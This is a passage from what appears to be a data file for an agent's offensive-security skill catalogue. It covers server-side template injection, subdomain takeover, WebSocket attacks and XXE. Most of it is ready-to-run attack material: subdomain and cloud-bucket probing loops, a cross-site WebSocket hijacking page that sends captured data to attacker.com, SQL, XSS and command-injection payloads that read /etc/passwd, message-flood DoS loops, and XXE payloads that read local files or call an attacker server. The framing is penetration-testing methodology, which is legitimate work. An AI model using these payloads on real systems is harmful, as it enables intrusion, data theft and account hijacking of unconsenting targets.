&quot;https://TARGET/api/render&quot; \\\n    -H &quot;Content-Type: application/json&quot; \\\n    -d &quot;{\\&quot;content\\&quot;:\\&quot;$payload\\&quot;}&quot;\ndone</code></pre>","n":2512},{"t":"What Constitutes a Finding","h":"<div class=\"tw\"><table><thead><tr><th>Finding</th><th>Severity</th></tr></thead><tbody><tr><td>Math expression evaluated (7*7=49)</td><td>High (P2)</td></tr><tr><td>Config/env data leaked</td><td>High (P2)</td></tr><tr><td>Command execution achieved</td><td>Critical (P1)</td></tr><tr><td>File read via template</td><td>Critical (P1)</td></tr></tbody></table></div>","n":225},{"t":"Evidence Requirements","h":"<ul class=\"ml\"><li>Injection point (parameter, endpoint)</li><li>Payload sent</li><li>Server response showing template evaluation</li><li>Template engine identified</li><li>For RCE: command output in response</li></ul>","n":167},{"t":"Tools","h":"<ul class=\"ml\"><li><code>tplmap</code> — automated multi-engine SSTI detection and exploitation framework</li><li><code>curl</code> payload-probe loops (Phase 2–5) — manual math/engine-fingerprint testing</li></ul>","n":159},{"t":"References","h":"<ul class=\"ml\"><li><a href=\"https://portswigger.net/research/server-side-template-injection\" target=\"_blank\" rel=\"noopener\">PortSwigger: SSTI</a></li><li><a href=\"https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection\" target=\"_blank\" rel=\"noopener\">PayloadsAllTheThings: SSTI</a></li></ul>","n":219}],"m":{"name":11,"desc":313,"body":3544,"file":4031,"dband":"optimal","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":30.6},"name":{"lim":64,"pct":17.2}}}},"attack-subdomain-takeover":{"slug":"attack-subdomain-takeover","pillar":"operators","name":"attack-subdomain-takeover","description":"Claim a dangling subdomain — enumerate names passively and from certificate transparency, resolve each CNAME to its third-party service, match the unclaimed-resource fingerprint such as NoSuchBucket or a missing Pages site, then register the resource and serve proof content under the target's own name. Reach for it when DNS still points at a cloud service that no longer answers for it.","family":"web-attack","ported":true,"source":".cyberstrike/skill/attack-subdomain-takeover/SKILL.md","summary":"Identify subdomains with dangling DNS records (CNAME pointing to unclaimed cloud resources) and claim them to serve attacker content.","file":"acordia-operators/skills/attack-subdomain-takeover/SKILL.md","used_by":["web-application"],"intro":"<p># Subdomain Takeover</p>","secs":[{"t":"Objective","h":"<p>Identify subdomains with dangling DNS records (CNAME pointing to unclaimed cloud resources) and claim them to serve attacker content.</p>","n":133},{"t":"Testing Methodology","h":"<h4 class=\"mh\">Phase 1: Subdomain Enumeration</h4><pre class=\"code\" data-lang=bash><code># Passive enumeration\nsubfinder -d TARGET.com -silent | tee subdomains.txt\n\n# Certificate transparency\ncurl -s &quot;https://crt.sh/?q=%25.TARGET.com&amp;output=json&quot; | jq -r '.[].name_value' | sort -u &gt;&gt; subdomains.txt\n\n# DNS brute force\npuredns bruteforce wordlist.txt TARGET.com -r resolvers.txt &gt;&gt; subdomains.txt</code></pre><h4 class=\"mh\">Phase 2: Automated Takeover Check</h4><pre class=\"code\" data-lang=bash><code># Check all subdomains for takeover — resolve CNAME then fingerprint the response\nwhile read -r sub; do\n  cname=$(dig +short CNAME &quot;$sub&quot;)\n  [ -z &quot;$cname&quot; ] &amp;&amp; continue\n  body=$(curl -s -m 5 &quot;https://$sub&quot;)\n  case &quot;$cname&quot; in\n    *github.io*)        echo &quot;$body&quot; | grep -qi &quot;There isn't a GitHub Pages site here&quot; &amp;&amp; echo &quot;TAKEOVER $sub -&gt; $cname (GitHub Pages)&quot; ;;\n    *herokuapp.com*)    echo &quot;$body&quot; | grep -qi &quot;No such app&quot; &amp;&amp; echo &quot;TAKEOVER $sub -&gt; $cname (Heroku)&quot; ;;\n    *myshopify.com*)    echo &quot;$body&quot; | grep -qi &quot;Sorry, this shop is currently unavailable&quot; &amp;&amp; echo &quot;TAKEOVER $sub -&gt; $cname (Shopify)&quot; ;;\n    *tumblr.com*)       echo &quot;$body&quot; | grep -qi &quot;there's nothing here&quot; &amp;&amp; echo &quot;TAKEOVER $sub -&gt; $cname (Tumblr)&quot; ;;\n    *wordpress.com*)    echo &quot;$body&quot; | grep -qi &quot;Do you want to register&quot; &amp;&amp; echo &quot;TAKEOVER $sub -&gt; $cname (WordPress)&quot; ;;\n    *s3.amazonaws.com*|*s3-website*) echo &quot;$body&quot; | grep -qi &quot;NoSuchBucket&quot; &amp;&amp; echo &quot;TAKEOVER $sub -&gt; $cname (AWS S3)&quot; ;;\n    *elasticbeanstalk.com*) echo &quot;$body&quot; | grep -qi &quot;404 Not Found&quot; &amp;&amp; echo &quot;CHECK $sub -&gt; $cname (AWS Elastic Beanstalk)&quot; ;;\n    *azurewebsites.net*) echo &quot;$body&quot; | grep -qi &quot;404 Web Site not found&quot; &amp;&amp; echo &quot;TAKEOVER $sub -&gt; $cname (Azure Web Apps)&quot; ;;\n    *netlify.app*)       echo &quot;$body&quot; | grep -qi &quot;Not Found - Request ID&quot; &amp;&amp; echo &quot;TAKEOVER $sub -&gt; $cname (Netlify)&quot; ;;\n    *vercel.app*)        echo &quot;$body&quot; | grep -qi &quot;DEPLOYMENT_NOT_FOUND&quot; &amp;&amp; echo &quot;TAKEOVER $sub -&gt; $cname (Vercel)&quot; ;;\n    *fastly.net*)        echo &quot;$body&quot; | grep -qi &quot;Fastly error: unknown domain&quot; &amp;&amp; echo &quot;TAKEOVER $sub -&gt; $cname (Fastly)&quot; ;;\n    *fly.dev*)           echo &quot;$body&quot; | grep -qi &quot;404 Not Found&quot; &amp;&amp; echo &quot;CHECK $sub -&gt; $cname (Fly.io)&quot; ;;\n    *bitbucket.io*)      echo &quot;$body&quot; | grep -qi &quot;Repository not found&quot; &amp;&amp; echo &quot;TAKEOVER $sub -&gt; $cname (Bitbucket)&quot; ;;\n    *surge.sh*)          echo &quot;$body&quot; | grep -qi &quot;project not found&quot; &amp;&amp; echo &quot;TAKEOVER $sub -&gt; $cname (Surge)&quot; ;;\n    *ghost.io*)          echo &quot;$body&quot; | grep -qi &quot;The thing you were looking for is no longer here&quot; &amp;&amp; echo &quot;TAKEOVER $sub -&gt; $cname (Ghost)&quot; ;;\n    *pantheonsite.io*)   echo &quot;$body&quot; | grep -qi &quot;The gods are wise&quot; &amp;&amp; echo &quot;TAKEOVER $sub -&gt; $cname (Pantheon)&quot; ;;\n    *zendesk.com*)       echo &quot;$body&quot; | grep -qi &quot;Help Center Closed&quot; &amp;&amp; echo &quot;TAKEOVER $sub -&gt; $cname (Zendesk)&quot; ;;\n    *readme.io*)         echo &quot;$body&quot; | grep -qi &quot;Project doesnt exist&quot; &amp;&amp; echo &quot;TAKEOVER $sub -&gt; $cname (README.io)&quot; ;;\n    *cargocollective.com*) echo &quot;$body&quot; | grep -qi &quot;404 Not Found&quot; &amp;&amp; echo &quot;CHECK $sub -&gt; $cname (Cargo)&quot; ;;\n    *feedpress.me*)      echo &quot;$body&quot; | grep -qi &quot;The feed has not been found&quot; &amp;&amp; echo &quot;TAKEOVER $sub -&gt; $cname (Feedpress)&quot; ;;\n  esac\ndone &lt; subdomains.txt\n\n# subjack, where installed, fingerprints the same services straight from a list\nsubjack -w subs.txt -t 100 -o takeover.txt</code></pre><p>Checks 20 cloud services:</p><ul class=\"ml\"><li>GitHub Pages, Heroku, Shopify, Tumblr, WordPress</li><li>AWS S3, AWS Elastic Beanstalk, Azure Web Apps</li><li>Netlify, Vercel, Fastly, Fly.io</li><li>Bitbucket, Surge, Ghost, Pantheon</li><li>Zendesk, README.io, Cargo, Feedpress</li></ul><h4 class=\"mh\">Phase 3: Manual CNAME Verification</h4><pre class=\"code\" data-lang=bash><code># Check CNAME records\ndig +short CNAME subdomain.TARGET.com\n\n# Verify the pointed service is unclaimed\ncurl -s https://subdomain.TARGET.com\n# Look for: &quot;There isn't a GitHub Pages site here&quot;\n# &quot;No such app&quot; (Heroku)\n# &quot;NoSuchBucket&quot; (S3)</code></pre><h4 class=\"mh\">Phase 4: Cloud Storage Enumeration</h4><pre class=\"code\" data-lang=bash><code># Check related cloud buckets for public access\nfor bucket in &quot;TARGET&quot; &quot;TARGET-backup&quot; &quot;TARGET-assets&quot; &quot;TARGET-static&quot; &quot;www-TARGET&quot;; do\n  echo &quot;== $bucket ==&quot;\n  curl -s -o /dev/null -w &quot;S3 (%{http_code}) &quot; &quot;https://$bucket.s3.amazonaws.com/&quot;\n  curl -s -o /dev/null -w &quot;GCS (%{http_code}) &quot; &quot;https://storage.googleapis.com/$bucket/&quot;\n  curl -s -o /dev/null -w &quot;Azure (%{http_code})\\n&quot; &quot;https://$bucket.blob.core.windows.net/$bucket?restype=container&amp;comp=list&quot;\ndone</code></pre><h4 class=\"mh\">Phase 5: Claim &amp; Verify</h4><p>After confirming a dangling CNAME:</p><ol class=\"ml\"><li>Create the resource on the target service (e.g., GitHub Pages repo, S3 bucket)</li><li>Serve a harmless proof page (e.g., <code>cyberstrike-takeover-proof.html</code>)</li><li>Verify it's accessible at <code>subdomain.TARGET.com</code></li></ol>","n":4548},{"t":"What Constitutes a Finding","h":"<div class=\"tw\"><table><thead><tr><th>Finding</th><th>Severity</th></tr></thead><tbody><tr><td>Subdomain takeover — attacker controls content</td><td>High (P2)</td></tr><tr><td>S3 bucket public write access</td><td>Critical (P1)</td></tr><tr><td>S3 bucket listing enabled</td><td>High (P2)</td></tr><tr><td>Dangling CNAME (service unreachable)</td><td>Medium (P3)</td></tr><tr><td>Cloud storage public read</td><td>Medium (P3)</td></tr></tbody></table></div>","n":299},{"t":"Evidence Requirements","h":"<ul class=\"ml\"><li>Subdomain with dangling CNAME record</li><li>Target cloud service identified</li><li>Service fingerprint (error message)</li><li>For takeover: proof of content hosting on subdomain</li><li>For buckets: listing output or write proof</li></ul>","n":209},{"t":"Tools","h":"<ul class=\"ml\"><li><code>dig</code> + fingerprint loop (Phase 2) — automated CNAME + fingerprint checker</li><li><code>curl</code> bucket-probe loop (Phase 4) — S3/Azure/GCP enumeration</li><li><code>subfinder</code>, <code>puredns</code> — subdomain enumeration</li><li><code>subjack -w subs.txt -t 100 -o takeover.txt</code> (external) — bulk takeover fingerprinting</li></ul>","n":278},{"t":"References","h":"<ul class=\"ml\"><li><a href=\"https://github.com/EdOverflow/can-i-take-over-xyz\" target=\"_blank\" rel=\"noopener\">Can I Take Over XYZ</a></li><li><a href=\"https://www.hackerone.com/vulnerability-management/guide-subdomain-takeovers\" target=\"_blank\" rel=\"noopener\">HackerOne: Subdomain Takeover</a></li></ul>","n":186}],"m":{"name":25,"desc":388,"body":5806,"file":6396,"dband":"optimal","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":37.9},"name":{"lim":64,"pct":39.1}}}},"attack-websocket":{"slug":"attack-websocket","pillar":"operators","name":"attack-websocket","description":"Attack a WebSocket channel — cross-site hijacking through an unvalidated Origin on the upgrade, tokens still honoured after logout or belonging to another user, injection inside messages the server never revalidates, and cleartext ws:// transport. Reach for it once an endpoint answers an upgrade handshake.","family":"web-attack","ported":true,"source":".cyberstrike/skill/attack-websocket/SKILL.md","summary":"Exploit WebSocket implementation flaws including cross-site WebSocket hijacking (CSWSH), message injection, and authentication bypass.","file":"acordia-operators/skills/attack-websocket/SKILL.md","used_by":["web-application"],"intro":"<p># WebSocket Security Testing</p>","secs":[{"t":"Objective","h":"<p>Exploit WebSocket implementation flaws including cross-site WebSocket hijacking (CSWSH), message injection, and authentication bypass.</p>","n":134},{"t":"Testing Methodology","h":"<h4 class=\"mh\">Phase 1: Identify WebSocket Endpoints</h4><pre class=\"code\" data-lang=bash><code># Look for WebSocket upgrade\ncurl -s -D- https://TARGET/ -H &quot;Upgrade: websocket&quot; -H &quot;Connection: Upgrade&quot;\n\n# Check common paths\nfor path in /ws /socket /websocket /api/ws /chat /live /realtime; do\n  curl -s -D- &quot;https://TARGET$path&quot; \\\n    -H &quot;Upgrade: websocket&quot; \\\n    -H &quot;Connection: Upgrade&quot; \\\n    -H &quot;Sec-WebSocket-Version: 13&quot; \\\n    -H &quot;Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==&quot; 2&gt;/dev/null | head -1\ndone\n\n# Cleartext transport — an endpoint served over ws:// rather than wss:// exposes\n# messages, tokens and session cookies on the wire</code></pre><h4 class=\"mh\">Phase 2: Cross-Site WebSocket Hijacking (CSWSH)</h4><p>Check if Origin header is validated:</p><pre class=\"code\" data-lang=bash><code># Connect with evil origin\nwebsocat -H &quot;Origin: https://evil.com&quot; &quot;wss://TARGET/ws&quot;\n\n# If connection succeeds with evil.com origin → CSWSH is possible</code></pre><p><strong>PoC HTML:</strong></p><pre class=\"code\" data-lang=html><code>&lt;script&gt;\nvar ws = new WebSocket('wss://TARGET/ws');\nws.onmessage = function(e) {\n  fetch('https://attacker.com/log?data=' + btoa(e.data));\n};\nws.onopen = function() {\n  ws.send(JSON.stringify({action: 'get_profile'}));\n};\n&lt;/script&gt;</code></pre><h4 class=\"mh\">Phase 3: Authentication Testing</h4><pre class=\"code\" data-lang=bash><code># Connect without auth token\nwebsocat &quot;wss://TARGET/ws&quot;\n\n# Test token reuse after logout\nwebsocat -H &quot;Cookie: session=EXPIRED_TOKEN&quot; &quot;wss://TARGET/ws&quot;\n\n# Connect with another user's token\nwebsocat -H &quot;Cookie: session=VICTIM_TOKEN&quot; &quot;wss://TARGET/ws&quot;</code></pre><h4 class=\"mh\">Phase 4: Message Injection</h4><pre class=\"code\" data-lang=bash><code># Test for SQL injection via WebSocket message\nwebsocat &quot;wss://TARGET/ws&quot; &lt;&lt;&lt; '{&quot;action&quot;:&quot;search&quot;,&quot;query&quot;:&quot;test\\&quot; OR 1=1--&quot;}'\n\n# XSS via WebSocket message (if rendered in other clients)\nwebsocat &quot;wss://TARGET/ws&quot; &lt;&lt;&lt; '{&quot;action&quot;:&quot;chat&quot;,&quot;message&quot;:&quot;&lt;img src=x onerror=alert(1)&gt;&quot;}'\n\n# SQL injection in a message parameter\nwebsocat &quot;wss://TARGET/ws&quot; &lt;&lt;&lt; '{&quot;action&quot;:&quot;getUser&quot;,&quot;id&quot;:&quot;1 OR 1=1&quot;}'\n\n# XSS in a message rendered by other clients\nwebsocat &quot;wss://TARGET/ws&quot; &lt;&lt;&lt; '{&quot;msg&quot;:&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;}'\n\n# Command injection\nwebsocat &quot;wss://TARGET/ws&quot; &lt;&lt;&lt; '{&quot;action&quot;:&quot;exec&quot;,&quot;cmd&quot;:&quot;id; cat /etc/passwd&quot;}'</code></pre><h4 class=\"mh\">Phase 5: Rate Limiting / DoS</h4><pre class=\"code\" data-lang=bash><code># Rapid message sending\nfor i in $(seq 1 1000); do\n  echo '{&quot;action&quot;:&quot;ping&quot;}'\ndone | websocat &quot;wss://TARGET/ws&quot;\n\n# Large message\npython3 -c &quot;print('{\\&quot;data\\&quot;:\\&quot;' + 'A'*1000000 + '\\&quot;}')&quot; | websocat &quot;wss://TARGET/ws&quot;</code></pre>","n":2323},{"t":"What Constitutes a Finding","h":"<div class=\"tw\"><table><thead><tr><th>Finding</th><th>Severity</th></tr></thead><tbody><tr><td>CSWSH — cross-site WebSocket hijacking</td><td>High (P2)</td></tr><tr><td>No authentication on WebSocket</td><td>High (P2)</td></tr><tr><td>SQL/command injection via WS message</td><td>Critical (P1)</td></tr><tr><td>Stored XSS via WS message</td><td>High (P2)</td></tr><tr><td>Session not invalidated after logout</td><td>Medium (P3)</td></tr></tbody></table></div>","n":301},{"t":"Evidence Requirements","h":"<ul class=\"ml\"><li>WebSocket endpoint URL</li><li>Connection with evil Origin (for CSWSH)</li><li>Messages sent and received</li><li>Proof of unauthorized data access or injection</li></ul>","n":144},{"t":"Tools","h":"<ul class=\"ml\"><li><code>websocat</code> (external) — WebSocket CLI client</li><li><code>wscat -c wss://TARGET/ws</code> (external, npm) — alternative WebSocket CLI client</li><li>Browser DevTools → Network → WS tab</li></ul>","n":164},{"t":"References","h":"<ul class=\"ml\"><li><a href=\"https://portswigger.net/web-security/websockets\" target=\"_blank\" rel=\"noopener\">PortSwigger: WebSocket Vulnerabilities</a></li><li><a href=\"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets\" target=\"_blank\" rel=\"noopener\">OWASP: WebSocket Security</a></li></ul>","n":266}],"m":{"name":16,"desc":307,"body":3493,"file":3984,"dband":"optimal","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":30.0},"name":{"lim":64,"pct":25.0}}}},"attack-xxe":{"slug":"attack-xxe","pillar":"operators","name":"attack-xxe","description":"Turn an XML parser into a file reader and an outbound channel — in-band entity file disclosure, parameter-entity and out-of-band exfiltration for the blind case, and delivery through SVG, DOCX and XLSX uploads, SOAP, SAML or a JSON endpoint switched to XML by content type. Reach for it wherever the target accepts XML.","family":"web-attack","ported":true,"source":".cyberstrike/skill/attack-xxe/SKILL.md","summary":"Exploit XML parsing vulnerabilities to read local files, perform SSRF, or exfiltrate data via out-of-band channels.","file":"acordia-operators/skills/attack-xxe/SKILL.md","used_by":["web-application"],"intro":"<p># XML External Entity (XXE) Injection</p>","secs":[{"t":"Objective","h":"<p>Exploit XML parsing vulnerabilities to read local files, perform SSRF, or exfiltrate data via out-of-band channels.</p>","n":115},{"t":"Testing Methodology","h":"<h4 class=\"mh\">Phase 1: Identify XML Processing</h4><p>Look for endpoints accepting:</p><ul class=\"ml\"><li><code>Content-Type: application/xml</code> or <code>text/xml</code></li><li>SOAP endpoints (<code>.asmx</code>, <code>.wsdl</code>)</li><li>File upload accepting SVG, DOCX, XLSX, PPTX</li><li>RSS/Atom feed processing</li><li>SAML authentication</li></ul><h4 class=\"mh\">Phase 2: In-Band XXE (File Read)</h4><pre class=\"code\" data-lang=xml><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;\n&lt;!DOCTYPE foo [\n  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;\n]&gt;\n&lt;root&gt;&amp;xxe;&lt;/root&gt;</code></pre><p><strong>Windows targets:</strong></p><pre class=\"code\" data-lang=xml><code>&lt;!ENTITY xxe SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt;</code></pre><h4 class=\"mh\">Phase 3: Blind XXE (Out-of-Band)</h4><pre class=\"code\" data-lang=xml><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;\n&lt;!DOCTYPE foo [\n  &lt;!ENTITY % xxe SYSTEM &quot;http://ATTACKER_SERVER/xxe.dtd&quot;&gt;\n  %xxe;\n]&gt;\n&lt;root&gt;test&lt;/root&gt;</code></pre><p><strong>Hosted DTD (xxe.dtd):</strong></p><pre class=\"code\" data-lang=xml><
